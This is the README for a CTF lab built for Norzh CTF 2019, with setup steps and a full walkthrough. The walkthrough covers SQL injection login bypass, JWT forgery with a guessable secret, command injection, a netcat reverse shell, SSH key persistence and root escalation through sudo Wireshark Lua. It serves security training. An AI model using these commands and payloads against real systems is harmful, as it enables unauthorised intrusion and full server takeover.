# JeanMi Construction

A little scenario with a few web & system challenges created for the [Norzh CTF](https://twitter.com/NorzhCTF) @ FIC 2019.

It has been created to work with a clean **Debian** VM.

## Setup

### Automated 

Just run the bash script and you should be ready to go :

```sh
$ ./setup.sh
```

### Web part - Manual

If : 
- You want to setup only chall 1 & 2
- the script doesn't work for you and you want to check if everything went correctly for the web part

Then :

To create the database you can use the SQL script with the relational database managament system of your choice.
I personnaly like SQLite for this kind of cases because it's very easy to setup and here you don't need to write into the database for this challenge.
You need to change the connection line in *pdo_connection.php* if you want to use something else than SQLite.

You can setup a SQLite database this way :

```sh
$ sqlite3 ./web/jeanmi-construction.db < generate-databse.sql
SQLite version 3.24.0 2018-06-04 14:10:15
Enter ".help" for usage hints.
sqlite> SELECT * FROM Users ;
1|user|35effb8d44421ae569cfaa9a2a2d76530df35d1d29afa42f5920f9bc4074771e
2|jeanmithebest|597f579d31603f69a07c6405f89e42c487553c9267e518339f325b4200f8efc7
```

*Do **not** use SHA256 to hash passwords, this is a challenge, not a good example (you should use PBKDF2, Bcrypt, Scrypt, ...)*.

Then, change the rights on the database file you just created :

```sh
$ chmod 755 ./web/jeanmi-construction.db 
```

Users are as following :

| Username         | Password (before hash)                    |
|------------------|-------------------------------------------|
| admin            | yoloswag$123$aaa                          |
| jeanmithebest    | JeanmiConstructionGlobalIndustrySince2018 |

## Goal

The challenge consists in :

1. **Finding a way to access the administrator pannel (as admin).** _(Web)_  
    To do so, you have to exploit an SQL injection that is not shown on the page. 
    You have to go to /login.php (findable with *dirbuster*) and process your SQLi.
    That's very basic and classical, yet, it is often presented with unashed password.
    I chosed on this one to present it with SHA-256 hashed passowrd and a SELECT COUNT() request.
    I actually did see it coded like that already on web apps.
    This illustrates a common situation for OWASP Top 10 2017 - A1.
2. **Finding a way to elevate your priveleges and become the super admin (basically, just become jeanmi).** _(Web)_  
    You have to change your [JWT](https://jwt.io/) token to gain privileges. 
    It's a bit harder because you have to know JWT. 
    Those tokens are sometimes used to replace session and do session management tasks in a "stateless" way.
    Here it is mixed with a very bad crypto because the secrect is a key you can bruteforce or find.
    This illustrates an uncommon but still very credible situation for OWASP Top 10 2017 - A2.
3. **Finding a password that JeanMi let while connected on the server.** _(Web / Basic System)_   
    You just have to exploit the command injection that is already on the server and eventually set up a reverse shell.
    That's probably the easiest part of the challenge, just see the hidden input and you're good to go.
    That's one of the most basic situation for OWASP Top 10 2017 - A1, hopefully you won't see it in a professional environment.
4. **Finding informations thet JeanMi let *as root* on the server.** _(System)_   
    To de so, you need to become root yourself.
    You have to use Wireshark X-Forwarding and a lua script to do so.

## Challenge solution

### Step 1

The login page is not shown. However it's super easy to find, just go to login.php and you're ready to go.
It's also shown on a few alt attributes on the page.
*dirbuster* finds it pretty fast.

This is a SQLInjection. SQL request is (in pseudo-code):

```sql
SELECT COUNT(*) FROM Users WHERE username='?' AND passwd=sha256hash('?')
```

People that creates SQL requests this way think they are protected because of the structure of the SQL request. 
Actually, if you have a username (and of course you have), that one is ultra easy to bypass. 

Just type this in username field:

```
admin' --
```

<img src="screenshots/screenshot_step1.png" width="600em" style="margin-left: auto; margin-right: auto;">


### Step 2

You can find the JWT in local storage. 

You lack the secret to decode this JWT. It is guessable but it is actually also ASCII encoded in the last chart of the page (the blue one).
When you decode the ascii, you can find that the key is "jeanmiconstruction" :

<img src="screenshots/screenshot_step2.png" width="700em" style="margin-left: auto; margin-right: auto;">

Just going to [jwt.io](https://jwt.io) allows you to decode the base64 and having a nice display ultra fast. Also allows to modify your JWT and have the new encoded token instantly.

So you have to change your JWT and create a new valid one to access to the "super admin". Just change the first payload into the second and generate checksum with the secret we talked about earlier (i.e. "jeanmiconstruction") :

```javascript
// JWT that has to be changed
{
  {
    "typ": "JWT",
    "alg": "HS256"
  }
  {
    "iat": 1546955481,
    "jti": "5c34aad99e7705.36244423",
    "nbf": 1546955481,
    "exp": 1546973481,
    "data": {
      "username": "admin' --",
      "is_jeanmi_the_god": "false"
    }
  }
}
```

```javascript
// JWT to access super admin panel
{
  {
    "typ": "JWT",
    "alg": "HS256"
  }
  {
    "iat": 1546955481,
    "jti": "5c34aad99e7705.36244423",
    "nbf": 1546955481,
    "exp": 1546973481,
    "data": {
      "username": "admin",
      "is_jeanmi_the_god": "true"
    }
  }
}
```
*Please note that thoses payloads will not work for you because of the dates. It is valid only january, 8th of 2019.*

<img src="screenshots/screenshot_step2_jwtio.png" width="700em" style="margin-left: auto; margin-right: auto;">

You now have a valid super admin token. You have few means to become super admin from now :

- First and most basic option is to intercept the request. We are going to call it the "pentester" way. You can use whatever tool you want to intercept the POST request to admin.php and replace the token with your forged one (Burp, ZAProxy, WebScarab, ...)
- Second option is to forge the request and send it directly. It's more of a "web-dev" way. I personnally like to do a little form to just send the request by clicking submit :

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Challenge resolver</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <form action="http://CHALLENGE_URL/admin.php" method="POST">
    <input type="text" name="token" value="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NDY5NTU0ODEsImp0aSI6IjVjMzRhYWQ5OWU3NzA1LjM2MjQ0NDIzIiwibmJmIjoxNTQ2OTU1NDgxLCJleHAiOjE1NDY5NzM0ODEsImRhdGEiOnsidXNlcm5hbWUiOiJhZG1pbiIsImlzX2plYW5taV90aGVfZ29kIjoidHJ1ZSJ9fQ.wvsiNnlWxKa0l3L8rScNdH1u6Y0dA04mIeah7sJLF0k">
    <input type="submit">
  </form>
</body>
</html>
```

Well played, you have access to the second flag and the third part of the challenge :


<img src="screenshots/screenshot_step2_finished.png" width="700em" style="margin-left: auto; margin-right: auto;">


### Step 3

It's a super easy step with web and just a cat, you have to exploit a command injection that trusts the user to access the system part of the challenge:

Just change the command in the code of the form and you're ready to do commands on the machine. 

There is absolutely no security or hardening for the command on the web part, pretty much nothing is done either on the server part.

<img src="screenshots/screenshot_step3.png" width="700em" style="margin-left: auto; margin-right: auto;">

Flag is in ```/home/jeanmi/flag```.

Just run a cat on the file and you have everything you need :
```sh
$ cat /home/jeanmi/flag
```

### Step 4

Now that you are able to execute commands on the server, you can gain an access with a reverse shell.
For that execute on your own computer
``` sh
$ nc -nlvp 51337
```

And then execute on the server via the command injection

```sh
$ nc -e /bin/sh <YOU IP> 51337
```

Now that you can easily execute any command, gain SSH access by adding your SSH public key in ```/home/jeanmi/.ssh/authorized_keys```
Then connect to the server with SSH.


Once you are connected, you can check jeanmi's sudo right.

```sh
$ sudo -l
```
<img src="screenshots/screenshot_step4_sudo.png" width="700em" style="margin-left: auto; margin-right: auto;">

You can execute wireshark as root. But wireshark is a GUI software so you need X11 forwarding. 

Hopefully, it seems up on the server.

<img src="screenshots/screenshot_step4_X11.png" width="700em" style="margin-left: auto; margin-right: auto;">

So, you can connect via SSH to the server with X11Forwarding

```sh
ssh -Y jeanmi@<SERVER IP>
```

Now you can execute wireshark as root.

```sh
sudo /usr/bin/wireshark
```

Once wireshark opened, by clicking on _Tools_ > _Lua_ > _Evaluate_ you'll be able to execute LUA.

<img src="screenshots/screenshot_step4_wireshark.png" width="700em" style="margin-left: auto; margin-right: auto;">

In the console you can write LUA code. The output will be on the shell where you launched wireshark.

```lua
os.execute("id")
```

<img src="screenshots/screenshot_step4_lua_id.png" width="700em" style="margin-left: auto; margin-right: auto;">

So you can print the flag.

```lua
os.execute("cat /root/flag")
```

<img src="screenshots/screenshot_step4_flag.png" width="700em" style="margin-left: auto; margin-right: auto;">




## License

This tool is licensed under a pretty uncomon license which is [CeCILL B](http://www.cecill.info/licences.en.html). 
It is a french license, extremely similar to BSD or Apache but more adapted to french law. 
I recommend you to read it but if you want a shortcut, just treat it the same way you usually do with an Apache license.

To quote the creators of the license : 

>   CeCILL-B follows the principle of the popular BSD license and its variants (Apache, X11 or W3C among others).
    In exchange for strong citation obligations (in all software incorporating a program covered by CeCILL-B and also through a Web site), the author authorizes the reuse of its software without any other constraints. 

## Creators

JeanMi Construction is a team work of [Fabien Leite](https://www.github.com/fabienleite) (web part : chall 1 to 3) & [Rémi Millerand (Driikolu)](https://driikolu.fr) (system part : chall 3 to 4 and setup).
